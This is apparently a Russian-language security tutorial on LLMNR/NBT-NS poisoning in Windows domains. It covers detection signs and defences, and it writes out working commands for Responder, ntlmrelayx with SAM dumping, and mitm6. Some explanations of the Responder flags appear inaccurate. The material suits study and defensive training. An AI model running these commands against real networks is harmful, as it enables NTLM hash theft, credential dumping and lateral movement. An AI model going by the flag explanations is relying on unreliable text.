# LLMNR Poisoning (Updated for 2025)

**Источник:** US Cloud, June 2025  
**Новизна в 2025:** Низкошумная техника для гибридных AD-сред, комбинируемая с IPv6 (MITM6) для перехвата NTLM-хэшей и обхода некоторых методов обнаружения.

---

## 🎯 Цель атаки
Перехват NTLM-хэшей пользователей в локальной сети через отравление протоколов LLMNR/NBT-NS и их последующая эксплуатация (relay/brute-force).

## 📋 Описание
LLMNR (Link-Local Multicast Name Resolution) и NBT-NS (NetBIOS Name Service) — резервные механизмы разрешения имён в Windows.  
Атакующий может ответить на широковещательный запрос, выдавая себя за искомый хост, что приводит к аутентификации жертвы на атакующем узле.

В 2025 добавлены:
- Комбинация с IPv6-атаками (MITM6) для повышения вероятности перехвата.
- Более тихие режимы работы в Responder/Impacket.

## ⚠ Условия эксплуатации
- LLMNR/NBT-NS включены на хостах.
- Нет защитных GPO для отключения этих протоколов.
- Клиенты обращаются к несуществующим или временно недоступным именам.

## 🔹 Пошагово в лаборатории
> ⚠ Только в тестовой среде!

1. Запуск Responder в тихом режиме:
```bash
responder -I eth0 -rdw
```
2. Перехват NTLM-хэшей при LLMNR/NBT-NS запросах.
3. Вариант: релей на SMB/LDAP с ntlmrelayx:
```bash
ntlmrelayx.py -t smb://filesrv.lab.local --dump-sam
```
4. Вариант: комбинация с MITM6 для IPv6:
```bash
mitm6 -d lab.local
```

## 📊 Признаки в логах и мониторинг
- Неожиданные SMB/LDAP входы с клиентских IP.
- Event ID 4624 (Logon Type 3) от нетипичных источников.
- DNS-запросы к странным именам и ответы с неожиданных адресов.

## 🛡 Меры защиты
- Отключить LLMNR и NBT-NS через GPO.
- Включить SMB/LDAP signing.
- Использовать DNSSEC и защищённые записи DNS.
- Мониторить аномалии в аутентификации.

## 🔍 Разбор команд

### 1. Запуск Responder в тихом режиме
```bash
responder -I eth0 -rdw
```
- **`-I eth0`** — сетевой интерфейс.
- **`-r`** — включить LLMNR.
- **`-d`** — включить NBT-NS.
- **`-w`** — включить WPAD.

### 2. Релей на SMB с ntlmrelayx
```bash
ntlmrelayx.py -t smb://filesrv.lab.local --dump-sam
```
- **`-t`** — цель релея.
- **`--dump-sam`** — выгрузка SAM на целевом хосте.

### 3. IPv6 MITM6
```bash
mitm6 -d lab.local
```
- **`-d`** — домен для атак через поддельные IPv6 DNS-ответы.
